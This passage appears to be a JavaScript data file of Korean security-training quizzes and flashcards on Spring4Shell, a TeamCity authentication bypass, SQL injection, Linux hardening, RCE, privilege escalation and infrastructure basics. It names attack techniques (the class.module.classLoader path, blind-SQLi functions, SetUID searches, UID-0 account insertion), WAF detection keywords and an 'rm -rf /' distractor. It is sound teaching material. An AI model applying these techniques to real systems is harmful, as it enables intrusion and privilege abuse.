// 정보보안 학습 퀴즈 데이터
const quizDatabase = {
    // ========== 취약점 진단 ==========
    'vuln-spring4shell': {
        title: 'Spring4Shell (CVE-2022-22965)',
        questions: [
            {
                q: 'Spring4Shell의 공식 CVE 번호는?',
                options: ['CVE-2022-22965', 'CVE-2024-27198', 'CVE-2021-44228', 'CVE-2022-26134'],
                correct: 0,
                exp: 'CVE-2022-22965가 Spring4Shell의 공식 CVE 번호입니다.'
            },
            {
                q: 'Spring4Shell의 CVSS 점수와 등급은?',
                options: ['9.8 Critical', '7.5 High', '5.3 Medium', '10.0 Critical'],
                correct: 0,
                exp: 'CVSS 9.8로 Critical 등급입니다.'
            },
            {
                q: 'Spring4Shell 공격에 필요한 최소 JDK 버전은?',
                options: ['JDK 8', 'JDK 9', 'JDK 11', 'JDK 17'],
                correct: 1,
                exp: 'JDK 9 이상이 필요합니다. JDK 9부터 도입된 모듈 시스템(Jigsaw)을 악용하기 때문입니다.'
            },
            {
                q: 'Spring4Shell 공격의 주요 타겟이 되는 서블릿 컨테이너는?',
                options: ['Jetty', 'Apache Tomcat', 'Undertow', 'WildFly'],
                correct: 1,
                exp: 'Apache Tomcat이 주요 타겟입니다. AccessLogValve를 조작하여 웹셸을 생성합니다.'
            },
            {
                q: 'Spring4Shell에서 악용되는 핵심 Spring 메커니즘은?',
                options: ['Dependency Injection', 'Data Binding', 'AOP', 'Transaction Management'],
                correct: 1,
                exp: 'Data Binding 메커니즘을 악용하여 내부 객체에 접근합니다.'
            },
            {
                q: 'Spring4Shell 공격 시 조작되는 Tomcat 내부 컴포넌트는?',
                options: ['Manager', 'AccessLogValve', 'Connector', 'Engine'],
                correct: 1,
                exp: 'AccessLogValve를 조작하여 로그 파일 경로와 패턴을 변경합니다.'
            },
            {
                q: 'Spring4Shell 공격에서 사용되는 파라미터 경로 패턴은?',
                options: ['admin.login.bypass', 'class.module.classLoader', 'system.exec.command', 'file.upload.path'],
                correct: 1,
                exp: 'class.module.classLoader 경로를 통해 ClassLoader 객체에 접근합니다.'
            },
            {
                q: 'Spring4Shell로 생성되는 웹셸의 일반적인 파일 확장자는?',
                options: ['.php', '.jsp', '.asp', '.py'],
                correct: 1,
                exp: '.jsp 또는 .jspx 확장자로 웹셸이 생성됩니다.'
            },
            {
                q: 'Spring4Shell 취약점이 패치된 Spring Framework 5.3.x 버전은?',
                options: ['5.3.15', '5.3.17', '5.3.18', '5.3.20'],
                correct: 2,
                exp: 'Spring Framework 5.3.18 이상에서 패치되었습니다.'
            },
            {
                q: 'Spring4Shell 공격 탐지를 위한 WAF 패턴에 포함되어야 할 키워드는?',
                options: ['exec', 'classLoader', 'admin', 'root'],
                correct: 1,
                exp: 'classLoader, pipeline, pattern 등의 키워드를 탐지해야 합니다.'
            },
            {
                q: 'Spring Boot Executable JAR 배포 방식은 Spring4Shell에 영향을 받는가?',
                options: ['영향을 받지 않음', '동일하게 영향받음', '일부 조건에서만 영향받음', '더 심각하게 영향받음'],
                correct: 2,
                exp: 'Executable JAR는 내장 Tomcat을 사용하여 일반적인 공격 경로는 차단되지만, 패치는 여전히 필요합니다.'
            },
            {
                q: 'Spring4Shell 공격 후 생성된 웹셸을 찾기 위해 확인해야 할 디렉토리는?',
                options: ['/var/log/', '/tmp/', 'webapps/ROOT/', '/etc/'],
                correct: 2,
                exp: 'Tomcat의 웹 루트 디렉토리(webapps/ROOT/)에 JSP 파일이 생성됩니다.'
            }
        ]
    },

    'vuln-teamcity': {
        title: 'TeamCity 인증 우회 (CVE-2024-27198)',
        questions: [
            {
                q: 'CVE-2024-27198의 취약점 유형은?',
                options: ['SQL Injection', 'Authentication Bypass', 'XSS', 'CSRF'],
                correct: 1,
                exp: '인증 우회(Authentication Bypass) 취약점입니다.'
            },
            {
                q: 'CVE-2024-27198의 CVSS 점수는?',
                options: ['7.5', '8.9', '9.8', '10.0'],
                correct: 2,
                exp: 'CVSS 9.8 Critical 등급입니다.'
            },
            {
                q: 'CVE-2024-27198의 CWE 분류는?',
                options: ['CWE-79', 'CWE-89', 'CWE-288', 'CWE-502'],
                correct: 2,
                exp: 'CWE-288 (인증 메커니즘 우회)로 분류됩니다.'
            },
            {
                q: 'CVE-2024-27198이 패치된 TeamCity 최소 버전은?',
                options: ['2023.10.5', '2023.11.4', '2024.01.1', '2024.03.1'],
                correct: 1,
                exp: 'TeamCity 2023.11.4 이상에서 패치되었습니다.'
            },
            {
                q: 'TeamCity 침해가 특히 위험한 이유는?',
                options: ['데이터베이스 연결', 'CI/CD 서버로 공급망 공격 가능', '많은 사용자 정보', '빠른 확산 속도'],
                correct: 1,
                exp: 'CI/CD 서버는 빌드 산출물, 자격증명, 배포 파이프라인을 가지고 있어 공급망 공격으로 확대될 수 있습니다.'
            },
            {
                q: 'CISA KEV 목록에 등재된 의미는?',
                options: ['이론적 취약점', '실제 악용 중인 취약점', '낮은 위험도', '패치 불필요'],
                correct: 1,
                exp: 'KEV(Known Exploited Vulnerabilities)는 실제로 악용되고 있는 취약점을 의미합니다.'
            },
            {
                q: 'CVE-2024-27198 공격의 첫 단계는?',
                options: ['SQL Injection', '정규화 우회 형태의 비정상 요청', '관리자 계정으로 로그인', '파일 업로드'],
                correct: 1,
                exp: '인증·인가 판단과 경로 정규화 처리의 불일치를 악용한 비정상 요청으로 시작됩니다.'
            },
            {
                q: 'TeamCity 침해 시 탈취 가능한 정보가 아닌 것은?',
                options: ['빌드 스크립트', '배포 키', '레지스트리 토큰', '사용자 브라우저 쿠키'],
                correct: 3,
                exp: 'TeamCity 서버 침해로는 사용자 브라우저 쿠키를 직접 탈취할 수 없습니다.'
            },
            {
                q: 'TeamCity 침해 탐지를 위해 모니터링해야 할 이벤트는?',
                options: ['일반 사용자 로그인', '관리자 계정 신규 생성', '빌드 성공', '프로젝트 조회'],
                correct: 1,
                exp: '무단 관리자 계정 생성, 권한 상승, 토큰 발급 등을 모니터링해야 합니다.'
            },
            {
                q: 'TeamCity 플러그인 디렉토리에서 모니터링해야 할 파일은?',
                options: ['.txt 파일', '.log 파일', '.zip/.jar 파일', '.xml 파일'],
                correct: 2,
                exp: '신규 zip/jar 및 출처 불명 플러그인을 탐지해야 합니다.'
            },
            {
                q: 'TeamCity 임시 완화 조치로 가장 효과적인 것은?',
                options: ['로그 레벨 증가', 'VPN/사내망으로 접근 제한', '비밀번호 복잡도 증가', '백업 빈도 증가'],
                correct: 1,
                exp: '인터넷 직접 노출을 차단하고 VPN/사내망/허용 IP로만 접근을 제한하는 것이 가장 효과적입니다.'
            },
            {
                q: 'TeamCity 침해 점검 시 확인해야 할 항목이 아닌 것은?',
                options: ['무단 관리자 계정', '플러그인 설치 목록', '빌드 설정 변경', '서버 CPU 사용률'],
                correct: 3,
                exp: 'CPU 사용률은 침해 지표가 아닙니다. 계정, 플러그인, 빌드 설정 등을 점검해야 합니다.'
            }
        ]
    },

    'vuln-sql-injection': {
        title: 'SQL Injection',
        questions: [
            {
                q: 'Blind SQL Injection에서 참/거짓을 판단하는 방법이 아닌 것은?',
                options: ['응답 내용 차이', '응답 시간 차이', '에러 메시지 확인', 'HTTP 상태 코드만 확인'],
                correct: 3,
                exp: 'HTTP 상태 코드만으로는 판단할 수 없습니다. 응답 내용, 시간, 에러 등을 활용합니다.'
            },
            {
                q: 'SQL에서 문자열의 일부를 추출하는 함수는?',
                options: ['split()', 'substr()', 'extract()', 'cut()'],
                correct: 1,
                exp: 'substr() 또는 substring() 함수를 사용합니다.'
            },
            {
                q: '문자를 ASCII 값으로 변환하는 MySQL 함수는?',
                options: ['chr()', 'ord()', 'ascii()', 'ord() 또는 ascii()'],
                correct: 3,
                exp: 'ord() 또는 ascii() 모두 사용 가능합니다.'
            },
            {
                q: '현재 데이터베이스 이름을 반환하는 MySQL 함수는?',
                options: ['db_name()', 'database()', 'current_db()', 'get_db()'],
                correct: 1,
                exp: 'database() 함수가 현재 DB 이름을 반환합니다.'
            },
            {
                q: 'MySQL에서 모든 테이블 이름을 저장하는 시스템 테이블은?',
                options: ['sys.tables', 'information_schema.tables', 'mysql.tables', 'schema.tables'],
                correct: 1,
                exp: 'information_schema.tables에 모든 테이블 정보가 저장됩니다.'
            },
            {
                q: 'Time-based SQL Injection에서 사용하는 MySQL 함수는?',
                options: ['wait()', 'sleep()', 'delay()', 'pause()'],
                correct: 1,
                exp: 'sleep() 함수로 의도적인 지연을 발생시킵니다.'
            },
            {
                q: 'Time-based Injection에서 sleep(4)를 사용했을 때, 몇 초 이상 응답이 지연되면 참으로 판단하는가?',
                options: ['1초', '2초', '3초', '5초'],
                correct: 2,
                exp: '일반적으로 sleep 시간보다 약간 작은 값(3초)을 임계값으로 사용합니다.'
            },
            {
                q: 'SQL Injection에서 주석 처리에 사용되는 기호는?',
                options: ['//', '/* */', '-- 또는 #', '모두 사용 가능'],
                correct: 3,
                exp: '--, #, /* */ 모두 SQL 주석으로 사용됩니다.'
            },
            {
                q: 'URL에서 # 기호를 인코딩한 값은?',
                options: ['%20', '%23', '%26', '%3D'],
                correct: 1,
                exp: '#는 %23으로 URL 인코딩됩니다.'
            },
            {
                q: 'SQL Injection 자동화 스크립트에서 세션 쿠키가 필요한 이유는?',
                options: ['속도 향상', '인증 상태 유지', '로그 남기지 않기', 'IP 우회'],
                correct: 1,
                exp: '인증이 필요한 페이지를 공격하기 위해 세션 상태를 유지해야 합니다.'
            },
            {
                q: 'UNION SQL Injection에서 UNION의 목적은?',
                options: ['데이터 삭제', '여러 SELECT 결과 결합', '테이블 생성', '권한 상승'],
                correct: 1,
                exp: 'UNION은 두 개 이상의 SELECT 쿼리 결과를 결합하여 추가 데이터를 추출합니다.'
            },
            {
                q: 'information_schema.columns 테이블의 용도는?',
                options: ['사용자 정보', '테이블의 컬럼 정보', '권한 정보', '로그 정보'],
                correct: 1,
                exp: 'information_schema.columns는 모든 테이블의 컬럼 정보를 저장합니다.'
            },
            {
                q: 'SQL Injection 방어를 위한 가장 효과적인 방법은?',
                options: ['입력값 길이 제한', 'Prepared Statement 사용', '특수문자 제거', '에러 메시지 숨김'],
                correct: 1,
                exp: 'Prepared Statement(파라미터화된 쿼리)가 가장 효과적인 방어 방법입니다.'
            }
        ]
    },

    'vuln-linux-config': {
        title: 'Linux 설정 파일 보안',
        questions: [
            {
                q: '/etc/passwd 파일의 필드 구분자는?',
                options: ['콤마(,)', '세미콜론(;)', '콜론(:)', '공백( )'],
                correct: 2,
                exp: '콜론(:)으로 필드를 구분합니다.'
            },
            {
                q: '/etc/passwd 파일의 총 필드 개수는?',
                options: ['5개', '6개', '7개', '8개'],
                correct: 2,
                exp: '7개 필드(사용자명:패스워드:UID:GID:설명:홈디렉토리:쉘)로 구성됩니다.'
            },
            {
                q: 'root 사용자의 UID는?',
                options: ['0', '1', '100', '1000'],
                correct: 0,
                exp: 'UID 0이 root 사용자를 의미합니다.'
            },
            {
                q: '/etc/passwd에서 x가 의미하는 것은?',
                options: ['계정 잠금', '패스워드가 /etc/shadow에 있음', '패스워드 없음', '특수 계정'],
                correct: 1,
                exp: 'x는 실제 암호화된 패스워드가 /etc/shadow에 저장되어 있음을 의미합니다.'
            },
            {
                q: '로그인을 막기 위한 쉘 설정은?',
                options: ['/bin/bash', '/bin/sh', '/usr/sbin/nologin', '/usr/bin/zsh'],
                correct: 2,
                exp: '/usr/sbin/nologin 또는 /bin/false를 사용하여 로그인을 차단합니다.'
            },
            {
                q: '/etc/shadow 파일의 권장 권한은?',
                options: ['644', '640', '755', '777'],
                correct: 1,
                exp: '640 또는 600으로 설정하여 root만 읽을 수 있게 해야 합니다.'
            },
            {
                q: '/etc/shadow에서 $6$가 의미하는 것은?',
                options: ['MD5', 'SHA-1', 'SHA-256', 'SHA-512'],
                correct: 3,
                exp: '$6$는 SHA-512 해시 알고리즘을 의미합니다.'
            },
            {
                q: '/etc/shadow에서 !!의 의미는?',
                options: ['강력한 패스워드', '계정 잠금', '만료된 패스워드', '임시 패스워드'],
                correct: 1,
                exp: '!! 또는 !는 계정이 잠겨있음을 의미합니다.'
            },
            {
                q: 'SSH에서 root 로그인을 차단하는 설정은?',
                options: ['RootLogin no', 'PermitRootLogin no', 'AllowRoot no', 'DenyRoot yes'],
                correct: 1,
                exp: 'PermitRootLogin no로 설정합니다.'
            },
            {
                q: 'SSH 패스워드 인증을 비활성화하는 설정은?',
                options: ['PasswordAuth no', 'PasswordAuthentication no', 'AllowPassword no', 'DisablePassword yes'],
                correct: 1,
                exp: 'PasswordAuthentication no로 설정하여 키 기반 인증만 허용합니다.'
            },
            {
                q: 'SSH 기본 포트를 변경하는 이유는?',
                options: ['속도 향상', '자동화된 봇 공격 감소', '보안 강화', '자동화된 봇 공격 감소 및 보안 강화'],
                correct: 3,
                exp: '기본 포트 22를 변경하면 자동화된 공격을 90% 이상 감소시킬 수 있습니다.'
            },
            {
                q: '/etc/login.defs에서 패스워드 최대 사용 기간을 설정하는 항목은?',
                options: ['PASS_MAX_DAYS', 'MAX_PASS_AGE', 'PASSWORD_MAX', 'MAX_DAYS'],
                correct: 0,
                exp: 'PASS_MAX_DAYS로 패스워드 최대 사용 기간을 설정합니다(권장: 60-90일).'
            },
            {
                q: '파일 권한 755의 의미는?',
                options: ['rwxr-xr-x', 'rwxrwxr-x', 'rwxr--r--', 'rw-r--r--'],
                correct: 0,
                exp: '소유자: rwx, 그룹: r-x, 기타: r-x를 의미합니다.'
            },
            {
                q: 'SetUID 비트의 위험성은?',
                options: ['파일 삭제 불가', '파일 소유자 권한으로 실행', '파일 수정 불가', '파일 읽기 불가'],
                correct: 1,
                exp: 'SetUID가 설정된 파일은 실행 시 파일 소유자의 권한으로 실행되어 권한 상승 위험이 있습니다.'
            },
            {
                q: '/tmp 디렉토리의 sticky bit 목적은?',
                options: ['빠른 접근', '자신의 파일만 삭제 가능', '암호화', '백업'],
                correct: 1,
                exp: 'Sticky bit는 사용자가 자신의 파일만 삭제할 수 있도록 제한합니다.'
            }
        ]
    },

    // ========== 모의해킹 ==========
    'pentest-rce': {
        title: 'RCE (Remote Code Execution)',
        questions: [
            {
                q: 'RCE의 정식 명칭은?',
                options: ['Remote Control Entry', 'Remote Code Execution', 'Restricted Command Execution', 'Root Control Exploit'],
                correct: 1,
                exp: 'Remote Code Execution의 약자로, 원격에서 코드를 실행하는 취약점입니다.'
            },
            {
                q: 'RCE가 가능할 때 가장 먼저 확인하는 명령어는?',
                options: ['rm -rf /', 'whoami', 'shutdown', 'format'],
                correct: 1,
                exp: 'whoami 명령으로 현재 실행 권한을 확인하는 것이 일반적입니다.'
            },
            {
                q: 'Spring4Shell에서 RCE를 달성하는 방법은?',
                options: ['SQL Injection', 'XSS', 'JSP 웹셸 생성', 'Buffer Overflow'],
                correct: 2,
                exp: 'AccessLogValve를 조작하여 JSP 웹셸을 생성하고 명령을 실행합니다.'
            },
            {
                q: 'Payload의 의미는?',
                options: ['공격 대상', '공격 도구', '악의적 동작을 수행하는 코드', '방어 메커니즘'],
                correct: 2,
                exp: 'Payload는 공격 시 실제로 악의적인 동작을 수행하는 코드나 데이터를 의미합니다.'
            },
            {
                q: 'Reverse Shell의 목적은?',
                options: ['서버가 공격자에게 연결', '공격자가 서버에 연결', '로그 삭제', '파일 암호화'],
                correct: 0,
                exp: 'Reverse Shell은 방화벽 우회를 위해 서버가 공격자에게 역으로 연결하는 기법입니다.'
            },
            {
                q: 'Web Shell의 주요 기능이 아닌 것은?',
                options: ['파일 업로드/다운로드', '명령어 실행', '자동 패치', '디렉토리 탐색'],
                correct: 2,
                exp: 'Web Shell은 자동 패치 기능을 제공하지 않습니다. 공격자가 서버를 제어하는 도구입니다.'
            },
            {
                q: 'RCE 공격 후 지속성 확보 방법이 아닌 것은?',
                options: ['백도어 계정 생성', 'cron 작업 등록', '시스템 재부팅', '서비스 등록'],
                correct: 2,
                exp: '시스템 재부팅은 지속성 확보가 아니라 오히려 연결을 끊는 행위입니다.'
            },
            {
                q: 'Command Injection 방어 방법으로 적절하지 않은 것은?',
                options: ['입력값 화이트리스트 검증', '시스템 명령어 사용 자제', '에러 메시지 노출', 'Prepared Statement 사용'],
                correct: 2,
                exp: '에러 메시지 노출은 오히려 정보를 제공하므로 방어 방법이 아닙니다.'
            },
            {
                q: 'RCE 탐지를 위한 모니터링 대상이 아닌 것은?',
                options: ['비정상 자식 프로세스', '외부 통신', 'CPU 사용률만', '파일 생성/수정'],
                correct: 2,
                exp: 'CPU 사용률만으로는 RCE를 탐지할 수 없습니다. 프로세스, 네트워크, 파일 변경을 함께 모니터링해야 합니다.'
            },
            {
                q: 'Linux에서 RCE 실행 시 자주 사용되는 쉘은?',
                options: ['/bin/bash', '/bin/cmd', '/bin/powershell', '/bin/terminal'],
                correct: 0,
                exp: '/bin/bash 또는 /bin/sh가 일반적으로 사용됩니다.'
            }
        ]
    },

    'pentest-privilege-escalation': {
        title: '권한 상승 (Privilege Escalation)',
        questions: [
            {
                q: 'Privilege Escalation의 한글 번역은?',
                options: ['권한 우회', '권한 상승', '권한 삭제', '권한 변경'],
                correct: 1,
                exp: '권한 상승을 의미하며, 낮은 권한에서 높은 권한을 획득하는 과정입니다.'
            },
            {
                q: 'Linux에서 root 권한을 의미하는 UID는?',
                options: ['0', '1', '100', '1000'],
                correct: 0,
                exp: 'UID 0이 root 사용자를 의미합니다.'
            },
            {
                q: 'SetUID 비트가 설정된 파일의 위험성은?',
                options: ['빠른 실행', '파일 소유자 권한으로 실행', '자동 삭제', '암호화'],
                correct: 1,
                exp: 'SetUID 파일은 실행 시 파일 소유자의 권한으로 실행되어 권한 상승에 악용될 수 있습니다.'
            },
            {
                q: 'SetUID 비트를 확인하는 명령어는?',
                options: ['ls -l', 'ls -la', 'find / -perm -4000', 'chmod +s'],
                correct: 2,
                exp: 'find / -perm -4000 명령으로 SetUID가 설정된 파일을 찾을 수 있습니다.'
            },
            {
                q: 'sudo 권한 확인 명령어는?',
                options: ['sudo list', 'sudo -l', 'sudo --list', 'sudoers'],
                correct: 1,
                exp: 'sudo -l 명령으로 현재 사용자가 sudo로 실행할 수 있는 명령어를 확인합니다.'
            },
            {
                q: 'sudo 설정 파일은?',
                options: ['/etc/sudo', '/etc/sudoers', '/etc/su', '/etc/admin'],
                correct: 1,
                exp: '/etc/sudoers 파일에 sudo 권한 설정이 저장됩니다.'
            },
            {
                q: 'cron 작업을 악용한 권한 상승 방법은?',
                options: ['root 소유 cron 스크립트에 명령 삽입', 'cron 서비스 중지', 'cron 로그 삭제', 'cron 시간 변경'],
                correct: 0,
                exp: 'root가 실행하는 cron 스크립트를 수정 가능하면 권한 상승이 가능합니다.'
            },
            {
                q: 'PATH 환경변수를 악용한 권한 상승 원리는?',
                options: ['PATH 삭제', '악성 실행파일을 PATH 앞부분에 배치', 'PATH 암호화', 'PATH 백업'],
                correct: 1,
                exp: '악성 실행파일을 PATH의 앞부분에 배치하여 원본 대신 실행되도록 합니다.'
            },
            {
                q: 'Kernel Exploit을 통한 권한 상승 방어법은?',
                options: ['사용자 삭제', '커널 업데이트', '로그 삭제', '방화벽 설정'],
                correct: 1,
                exp: '커널을 최신 버전으로 업데이트하여 알려진 취약점을 패치합니다.'
            },
            {
                q: '/etc/passwd 쓰기 권한이 있을 때 가능한 공격은?',
                options: ['파일 암호화', 'root 계정 추가', '시스템 종료', '로그 삭제'],
                correct: 1,
                exp: '/etc/passwd에 UID 0인 계정을 추가하여 root 권한을 얻을 수 있습니다.'
            }
        ]
    },

    // ========== 네트워크&리눅스 ==========
    'network-osi': {
        title: 'OSI 7계층 모델',
        questions: [
            {
                q: 'OSI 7계층 모델에서 Transport 계층은 몇 번째 계층인가?',
                options: ['2계층', '3계층', '4계층', '5계층'],
                correct: 2,
                exp: 'Transport Layer는 4계층입니다.'
            },
            {
                q: 'OSI 모델의 Application 계층은 몇 번째인가?',
                options: ['5계층', '6계층', '7계층', '8계층'],
                correct: 2,
                exp: 'Application Layer는 최상위인 7계층입니다.'
            },
            {
                q: 'Network 계층의 주요 프로토콜은?',
                options: ['TCP', 'IP', 'HTTP', 'Ethernet'],
                correct: 1,
                exp: 'IP(Internet Protocol)가 3계층인 Network 계층의 주요 프로토콜입니다.'
            },
            {
                q: 'TCP가 동작하는 계층은?',
                options: ['2계층', '3계층', '4계층', '7계층'],
                correct: 2,
                exp: 'TCP는 4계층인 Transport 계층에서 동작합니다.'
            },
            {
                q: 'Data Link 계층에서 사용되는 주소는?',
                options: ['IP 주소', 'MAC 주소', '포트 번호', '도메인 이름'],
                correct: 1,
                exp: '2계층인 Data Link 계층에서는 MAC 주소를 사용합니다.'
            },
            {
                q: 'Physical 계층의 주요 기능은?',
                options: ['라우팅', '전기 신호 전송', '암호화', '압축'],
                correct: 1,
                exp: '1계층인 Physical 계층은 전기 신호, 광신호 등 물리적인 전송을 담당합니다.'
            },
            {
                q: 'HTTP 프로토콜이 동작하는 계층은?',
                options: ['4계층', '5계층', '6계층', '7계층'],
                correct: 3,
                exp: 'HTTP는 7계층인 Application 계층 프로토콜입니다.'
            },
            {
                q: 'TCP와 UDP의 공통점은?',
                options: ['모두 3계층', '모두 4계층', '모두 연결지향', '모두 비연결지향'],
                correct: 1,
                exp: 'TCP와 UDP 모두 4계층 Transport 계층 프로토콜입니다.'
            },
            {
                q: 'TCP의 특징이 아닌 것은?',
                options: ['연결지향', '신뢰성 있는 전송', '순서 보장', '브로드캐스트 지원'],
                correct: 3,
                exp: 'TCP는 브로드캐스트를 지원하지 않습니다. UDP에서 가능합니다.'
            },
            {
                q: 'UDP의 장점은?',
                options: ['높은 신뢰성', '순서 보장', '빠른 전송 속도', '에러 복구'],
                correct: 2,
                exp: 'UDP는 연결 설정 없이 빠르게 전송할 수 있습니다.'
            },
            {
                q: '3-way handshake를 사용하는 프로토콜은?',
                options: ['UDP', 'TCP', 'ICMP', 'ARP'],
                correct: 1,
                exp: 'TCP는 연결 수립 시 3-way handshake를 사용합니다.'
            }
        ]
    },

    'network-docker': {
        title: 'Docker 기초',
        questions: [
            {
                q: 'Docker 컨테이너와 가상 머신의 주요 차이점은?',
                options: ['가상 머신이 더 가벼움', '컨테이너가 호스트 OS 커널 공유', '차이 없음', '컨테이너가 더 느림'],
                correct: 1,
                exp: 'Docker 컨테이너는 호스트 OS의 커널을 공유하여 가볍고 빠릅니다.'
            },
            {
                q: 'Docker 이미지를 다운로드하는 명령어는?',
                options: ['docker download', 'docker pull', 'docker get', 'docker fetch'],
                correct: 1,
                exp: 'docker pull 명령으로 이미지를 다운로드합니다.'
            },
            {
                q: '실행 중인 컨테이너 목록을 보는 명령어는?',
                options: ['docker list', 'docker ps', 'docker show', 'docker containers'],
                correct: 1,
                exp: 'docker ps 명령으로 실행 중인 컨테이너를 확인합니다.'
            },
            {
                q: 'Docker 이미지를 빌드하는 명령어는?',
                options: ['docker create', 'docker build', 'docker make', 'docker compile'],
                correct: 1,
                exp: 'docker build 명령으로 Dockerfile에서 이미지를 생성합니다.'
            },
            {
                q: 'Docker 컨테이너를 백그라운드에서 실행하는 옵션은?',
                options: ['-b', '-d', '-bg', '--background'],
                correct: 1,
                exp: '-d (detached) 옵션으로 백그라운드 실행합니다.'
            },
            {
                q: 'Dockerfile에서 베이스 이미지를 지정하는 명령어는?',
                options: ['BASE', 'FROM', 'IMAGE', 'USE'],
                correct: 1,
                exp: 'FROM 명령으로 베이스 이미지를 지정합니다.'
            },
            {
                q: 'Docker 컨테이너 내부에서 명령어를 실행하는 방법은?',
                options: ['docker run', 'docker exec', 'docker cmd', 'docker command'],
                correct: 1,
                exp: 'docker exec 명령으로 실행 중인 컨테이너에서 명령을 실행합니다.'
            },
            {
                q: 'Docker 네트워크에서 컨테이너 간 통신을 위한 기본 네트워크는?',
                options: ['host', 'bridge', 'none', 'overlay'],
                correct: 1,
                exp: 'bridge 네트워크가 기본으로 사용되어 컨테이너 간 통신이 가능합니다.'
            },
            {
                q: 'Docker 볼륨의 목적은?',
                options: ['네트워크 설정', '데이터 영속성', '이미지 압축', 'CPU 할당'],
                correct: 1,
                exp: '볼륨은 컨테이너가 삭제되어도 데이터를 유지하기 위해 사용합니다.'
            },
            {
                q: 'Docker Hub의 역할은?',
                options: ['컨테이너 실행', '이미지 레지스트리', '로그 수집', '모니터링'],
                correct: 1,
                exp: 'Docker Hub는 Docker 이미지를 저장하고 공유하는 레지스트리입니다.'
            }
        ]
    },

    'network-kubernetes': {
        title: 'Kubernetes 기초',
        questions: [
            {
                q: 'Kubernetes에서 배포 가능한 가장 작은 단위는?',
                options: ['Container', 'Pod', 'Node', 'Service'],
                correct: 1,
                exp: 'Pod가 Kubernetes에서 배포 가능한 가장 작은 단위입니다.'
            },
            {
                q: 'Pod는 몇 개의 컨테이너를 포함할 수 있는가?',
                options: ['정확히 1개', '1개 이상', '최대 10개', '무제한'],
                correct: 1,
                exp: 'Pod는 하나 이상의 컨테이너를 포함할 수 있습니다.'
            },
            {
                q: 'Kubernetes 클러스터를 제어하는 CLI 도구는?',
                options: ['k8s', 'kubectl', 'kubeadm', 'kubelet'],
                correct: 1,
                exp: 'kubectl이 Kubernetes 클러스터를 제어하는 명령줄 도구입니다.'
            },
            {
                q: 'Pod 목록을 조회하는 명령어는?',
                options: ['kubectl list pods', 'kubectl get pods', 'kubectl show pods', 'kubectl ps'],
                correct: 1,
                exp: 'kubectl get pods 명령으로 Pod 목록을 조회합니다.'
            },
            {
                q: 'Deployment의 주요 기능은?',
                options: ['로깅', 'Pod의 선언적 업데이트', '네트워크 설정', '스토리지 관리'],
                correct: 1,
                exp: 'Deployment는 Pod의 선언적 업데이트와 롤링 업데이트를 관리합니다.'
            },
            {
                q: 'Service의 역할은?',
                options: ['이미지 빌드', 'Pod에 대한 네트워크 접근 제공', '로그 수집', '모니터링'],
                correct: 1,
                exp: 'Service는 Pod 그룹에 대한 안정적인 네트워크 엔드포인트를 제공합니다.'
            },
            {
                q: 'Kubernetes Master Node의 구성요소가 아닌 것은?',
                options: ['API Server', 'Scheduler', 'Kubelet', 'Controller Manager'],
                correct: 2,
                exp: 'Kubelet은 Worker Node에서 실행되는 구성요소입니다.'
            },
            {
                q: 'Namespace의 목적은?',
                options: ['CPU 할당', '리소스 격리 및 관리', '이미지 저장', '로그 수집'],
                correct: 1,
                exp: 'Namespace는 클러스터 내 리소스를 논리적으로 격리하고 관리하기 위해 사용합니다.'
            },
            {
                q: 'ConfigMap의 용도는?',
                options: ['비밀번호 저장', '설정 데이터 저장', '이미지 저장', '로그 저장'],
                correct: 1,
                exp: 'ConfigMap은 비밀이 아닌 설정 데이터를 저장하고 Pod에 제공합니다.'
            },
            {
                q: 'Secret와 ConfigMap의 차이점은?',
                options: ['크기 제한', 'Secret은 민감 정보 저장', '네임스페이스', '수정 불가'],
                correct: 1,
                exp: 'Secret은 패스워드, 토큰 등 민감한 정보를 base64 인코딩하여 저장합니다.'
            },
            {
                q: 'Ingress의 역할은?',
                options: ['Pod 생성', '외부에서 클러스터로의 HTTP/HTTPS 라우팅', '로그 수집', '모니터링'],
                correct: 1,
                exp: 'Ingress는 외부 트래픽을 클러스터 내부 Service로 라우팅합니다.'
            }
        ]
    }
};

// 플래시카드 데이터
const flashcardDatabase = {
    vulnerability: [
        { front: 'CVE-2022-22965', back: 'Spring4Shell\n\nSpring Framework의 Data Binding 취약점을 악용한 RCE\n\nJDK 9+, Tomcat, WAR 배포 환경에서 발생' },
        { front: 'CVSS 9.8', back: 'Critical 등급\n\n원격에서 인증 없이 완전한 시스템 제어 가능\n\nSpring4Shell과 TeamCity CVE가 해당' },
        { front: 'Data Binding', back: 'HTTP 요청 파라미터를 Java 객체 필드에 자동 매핑하는 Spring 메커니즘\n\nSpring4Shell에서 악용됨' },
        { front: 'AccessLogValve', back: 'Tomcat의 액세스 로그 기록 컴포넌트\n\nSpring4Shell 공격에서 pattern을 JSP 코드로, directory를 웹루트로 변경하여 웹셸 생성' },
        { front: 'class.module.classLoader', back: 'Spring4Shell 공격 시 사용되는 파라미터 경로\n\nClassLoader 객체에 접근하여 내부 설정 조작' },
        { front: 'CVE-2024-27198', back: 'TeamCity 인증 우회 취약점\n\n경로 정규화 불일치로 인증 없이 관리 기능 접근\n\nCI/CD 서버 침해로 공급망 공격 가능' },
        { front: 'KEV', back: 'Known Exploited Vulnerabilities\n\nCISA가 관리하는 실제 악용 중인 취약점 목록\n\n높은 우선순위로 패치 필요' },
        { front: 'Supply Chain Attack', back: '공급망 공격\n\nCI/CD 서버 침해로 빌드 산출물에 악성 코드 삽입\n\n조직 전체로 피해 확산' },
        { front: 'Blind SQL Injection', back: '쿼리 결과가 직접 보이지 않는 SQL Injection\n\n참/거짓 응답 차이나 시간 지연으로 데이터 추출' },
        { front: 'substr()', back: 'SQL 문자열 일부 추출 함수\n\nsubstr(database(), 1, 1)로 DB 이름 한 글자씩 추출' },
        { front: 'ord() / ascii()', back: '문자를 ASCII 값으로 변환하는 MySQL 함수\n\nBlind SQL Injection에서 비교에 사용' },
        { front: 'information_schema', back: 'MySQL 시스템 데이터베이스\n\ntables, columns 테이블로 모든 DB 구조 정보 조회 가능' },
        { front: 'sleep()', back: 'MySQL 지연 함수\n\nTime-based SQL Injection에서 조건 참일 때 지연 발생' },
        { front: '/etc/passwd', back: 'Linux 사용자 계정 정보 파일\n\n7개 필드: 사용자명:x:UID:GID:설명:홈:쉘\n\n권한 644 (누구나 읽기 가능)' },
        { front: '/etc/shadow', back: '암호화된 패스워드 저장 파일\n\n$6$ = SHA-512, !! = 계정 잠금\n\n권한 640/600 (root만 접근)' },
        { front: 'UID 0', back: 'root 사용자의 UID\n\nUID 0을 가진 모든 계정은 root 권한' },
